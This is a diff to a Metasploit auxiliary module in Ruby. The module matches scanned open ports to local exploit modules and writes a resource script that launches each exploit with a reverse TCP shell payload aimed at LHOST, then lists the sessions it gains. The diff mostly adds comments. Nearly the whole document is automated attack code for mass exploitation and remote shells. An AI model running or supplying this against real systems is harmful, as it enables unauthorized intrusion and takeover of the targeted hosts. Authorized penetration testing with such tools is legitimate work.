@@ -122,19 +122,12 @@ class MetasploitModule < Msf::Auxiliary
         r.each do |res|
           report_service(:host => res[0], :port => res[1], :state => res[2])
         end
-#        if File.file?("./msfexec.rc")
-#          File.delete("./msfexec.rc")
-#        end
-#        open('msfexec.rc', 'a') { |f|
-#          f.puts("back")
-#          f.puts("set RHOSTS #{datastore['RHOSTS']}")
-#          f.puts("set LHOST #{datastore['LHOST']}")
-#          f.puts("set ExitOnSession false")
-#        }
+        # generic shell backup
         $payl = "generic_shell_reverse"
         # use port scanning to build script here
         for openport in opentcp do
           msfmodules = []
+          # find modules  and loop over them
           msfmodules = Find.find(datastore['LPATH']).select { |p| /.*\.rb$/ =~ p }
           for mod in msfmodules do
             if  File.open(mod).grep(/\(#{openport}\)/) do
@@ -143,6 +136,7 @@ class MetasploitModule < Msf::Auxiliary
                 m.puts("use #{mod}")
                 print_good("Adding exploit: #{mod}")
                 m.puts("set LPORT #{$handler}")
+                # try to guess the payload shell from the current exploit
                 if mod["linux"] 
                   payl = "linux/#{datastore['ARCH']}/shell_reverse_tcp"
                 end 
@@ -165,21 +159,24 @@ class MetasploitModule < Msf::Auxiliary
                   payl = "solaris/#{datastore['ARCH']}/shell_reverse_tcp"
                 end
                 m.puts("set payload #{payl}")
+                # sleep fixes some parallelism bugs
                 m.puts("sleep 0.08")
                 m.puts("exploit -j -z")
                 m.puts("back")
               }
+              # increment the handler so that its on a different LPORT
               $handler = $handler + 1
            end
           end
         end
       end
     end
+    # kill jobs and then list sessions
     open('msfexec.rc', 'a') { |f|
-  #    f.puts("exit") 
       f.puts("jobs -K")
       f.puts("sessions")
     }
+    # run it!
     print_good("Now run 'resource msfexec.rc' to exploit #{datastore['RHOSTS']}")
   end
 end
